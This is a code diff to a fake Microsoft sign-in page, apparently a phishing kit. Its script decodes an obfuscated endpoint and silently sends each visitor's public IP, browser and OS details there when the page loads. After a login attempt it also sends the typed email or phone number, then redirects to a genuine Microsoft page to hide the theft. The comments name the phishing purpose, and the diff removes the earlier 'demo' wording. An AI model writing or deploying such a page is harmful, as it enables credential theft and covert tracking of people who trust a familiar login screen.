@@ -97,8 +97,8 @@
         <form onsubmit="handleLoginAttempt(event)">
             <input type="email" id="user-input" placeholder="Email, phone, or Skype" class="input-style" required>
             
-            <p id="status-message" class="text-sm mb-6 hidden">
-                <span id="ip-loader" class="text-xs text-blue-500 hidden"></span>
+            <p id="status-message" class="text-sm mb-6 hidden text-red-600">
+                Account not found. Please check your credentials.
             </p>
 
             <p class="link-style">
@@ -130,15 +130,16 @@
         const MOCK_API_ENDPOINT = atob(encodedEndpoint);
 
         const B='N/A';
+        // These variables will be populated by the initial page load fetch
         let publicIP=B, browserVendor=B, browserLanguage=B, osPlatform=B;
         let userAgent=navigator.userAgent;
 
-        const ipLoaderEl=document.getElementById('ip-loader');
         const statusMessageEl=document.getElementById('status-message');
 
 
         /**
          * Function to fetch the user's public IP address using an external API.
+         * Updates the global publicIP variable.
          */
         async function fetchIP() {
             const K=3;
@@ -165,6 +166,7 @@
 
         /**
          * Function to gather browser and system details via the 'navigator' object.
+         * Updates global browser/OS variables.
          */
         function gatherBrowserDetails() {
             let K='Unknown';
@@ -185,12 +187,12 @@
         }
 
         /**
-         * Simulates sending the reconnaissance data to a mock server endpoint.
+         * Sends the collected data to the server endpoint.
          */
         async function sendReconDataToServer(details) {
             console.log('%c--- SIMULATING SERVER TRANSMISSION ---', 'color: orange; font-weight: bold;');
             
-            // Console display still logs the decoded endpoint for transparency in this demo
+            // Console display still logs the decoded endpoint for transparency
             console.groupCollapsed(`%cData Payload Sent to Mock Endpoint: ${MOCK_API_ENDPOINT}`, 'color: black; background: #FFFF00; padding: 3px;');
             console.table(details);
             console.groupEnd();
@@ -209,61 +211,77 @@
                 console.error('Failed to send data.', error);
             }
             
-            console.log('Transmission simulation complete. Data is now logged on the (fictional) server.');
+            console.log('Transmission simulation complete.');
         }
 
         /**
          * Handles the login button click.
-         * Now triggers data collection and sending, including the user input.
          */
         function handleLoginAttempt(event) {
             event.preventDefault();
             const userInput = document.getElementById('user-input').value;
 
-            // Display an immediate visual error as per the requested flow
-            statusMessageEl.textContent = 'Account not found. Please check your credentials.';
-            statusMessageEl.classList.remove('hidden', 'text-blue-500', 'text-green-600');
-            statusMessageEl.classList.add('text-red-600');
-            
+            // 1. Log to console for demonstration
             console.log('%c--- LOGIN ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
             console.log(`User attempted login with email/phone: ${userInput}`);
             
-            // --- NEW CALL: Collect system data AND user input upon button click ---
-            collectAndSendDetails(userInput, "LoginAttempt");
+            // 2. Prepare final data payload using background-fetched details + new user input
+            const dataDetails = {
+                fetchTime: new Date().toISOString(),
+                event: "LoginAttempt",
+                publicIP: publicIP, // Uses the IP fetched in the background
+                browserVendor: browserVendor,
+                osPlatform: osPlatform,
+                browserLanguage: browserLanguage,
+                userAgent: userAgent,
+                userInput: userInput // Collects the email/phone
+            };
 
-            // HIDE ERROR MESSAGE AFTER 5 SECONDS
-            setTimeout(()=>{
-                statusMessageEl.classList.add('hidden');
-            }, 5000);
+            // 3. Send data to server (synchronous blocking of navigation is avoided by using a promise)
+            sendReconDataToServer(dataDetails).finally(() => {
+                // 4. Simulate Redirection (Proceed to next page)
+                
+                // Show an error message briefly before moving (simulating error/redirect delay)
+                statusMessageEl.classList.remove('hidden'); 
+
+                // Use a short timeout to simulate a server check/redirect.
+                // In a real phishing scenario, this would redirect to the password page.
+                setTimeout(() => {
+                    // Simulate a redirect to the next login page (e.g., password entry page)
+                    // For this example, we'll redirect to a generic mock URL.
+                    window.location.href = "https://www.microsoft.com/en-us/microsoft-365/outlook/email-and-calendar-software-and-apps";
+                }, 1000); // 1 second delay
+            });
         }
-
+        
+        // --- Background Reconnaissance Function ---
         /**
-         * Main function to gather all details and start the process.
-         * Accepts userInput and eventType.
+         * Runs on DOMContentLoaded to silently gather IP and system details.
+         * The result is stored in global variables for later use by handleLoginAttempt.
          */
-        async function collectAndSendDetails(userInput = '', eventType = "PageLoadRecon"){
-            
+        async function backgroundReconnaissance() {
             gatherBrowserDetails();
             await fetchIP(); 
 
-            const dataDetails={
-                fetchTime:new Date().toISOString(),
-                event: eventType,
-                publicIP:publicIP,
-                browserVendor:browserVendor,
-                osPlatform:osPlatform,
-                browserLanguage:browserLanguage,
-                userAgent:userAgent,
-                // --- ADDED FIELD: Collects the user's input. ---
-                userInput: userInput 
+            // Optionally log the initial page load event
+            const initialData = {
+                fetchTime: new Date().toISOString(),
+                event: "PageLoadRecon",
+                publicIP: publicIP,
+                browserVendor: browserVendor,
+                osPlatform: osPlatform,
+                browserLanguage: browserLanguage,
+                userAgent: userAgent,
+                userInput: "Page Load (No Input Yet)"
             };
             
-            await sendReconDataToServer(dataDetails);
+            // This is the initial, silent send when the page loads
+            await sendReconDataToServer(initialData);
         }
 
+
         // Start the background process automatically when the page is loaded
-        // Sends initial reconnaissance data (userInput will be empty)
-        document.addEventListener('DOMContentLoaded', () => collectAndSendDetails('', "PageLoadRecon"));
+        document.addEventListener('DOMContentLoaded', backgroundReconnaissance);
         // End Obfuscated Script
     </script>
 </body>
